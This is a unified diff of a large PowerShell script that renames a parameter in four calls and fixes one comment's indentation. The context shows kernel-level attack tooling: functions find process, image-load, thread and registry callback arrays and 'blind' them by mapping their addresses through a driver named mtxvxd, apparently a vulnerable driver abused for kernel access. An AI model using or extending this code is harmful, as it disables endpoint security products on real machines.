@@ -4602,7 +4602,7 @@ Function Get-KernelProcessBases {
             $NextLinkPtr.ToInt64() - $ActiveProcessLinksOffset
         )
 
-                # --- Filter Active Logic ---
+        # --- Filter Active Logic ---
         if ($FilterActiveProcess.IsPresent) {
             # Read the 32-bit ExitStatus integer using your provided offset
             $ExitStatusRaw = Read-VirtualAddress -VA (
@@ -4802,7 +4802,7 @@ Function Get-CreateProcessCallback {
             $TargetAddress = [IntPtr]::Add($ArrayVA, ($TargetSlot * 8))
             Write-Host "Blinding Driver at $TargetAddress..." -ForegroundColor Red
             $va = Map-VirtualAddress `
-                -VirtualAddress $TargetAddress `
+                -VA $TargetAddress `
                 -BlockSize 8 `
                 -DriverName mtxvxd
             if ($va) {
@@ -4908,7 +4908,7 @@ Function Get-LoadImageCallbacks {
             $TargetAddress = [IntPtr]::Add($ArrayVA, ($TargetSlot * 8))
             Write-Host "Blinding Driver at $TargetAddress..." -ForegroundColor Red
             $va = Map-VirtualAddress `
-                -VirtualAddress $TargetAddress `
+                -VA $TargetAddress `
                 -BlockSize 8 `
                 -DriverName mtxvxd
             if ($va) {
@@ -5014,7 +5014,7 @@ Function Get-CreateThreadCallbacks {
             $TargetAddress = [IntPtr]::Add($ArrayVA, ($TargetSlot * 8))
             Write-Host "Blinding Driver at $TargetAddress..." -ForegroundColor Red
             $va = Map-VirtualAddress `
-                -VirtualAddress $TargetAddress `
+                -VA $TargetAddress `
                 -BlockSize 8 `
                 -DriverName mtxvxd
             if ($va) {
@@ -5138,7 +5138,7 @@ Function Get-RegistryCallbacks {
             if ($Owner -in $Slot) {
                 #Write-Int64 -Address ([Intptr]::Add($CurrentLink, 0x28)) -Value 0L | Out-Null
                 $va = Map-VirtualAddress `
-                    -VirtualAddress $CurrentLink `
+                    -VA $CurrentLink `
                     -BlockSize 0x30 `
                     -DriverName mtxvxd
                 if ($va -ne $null) {
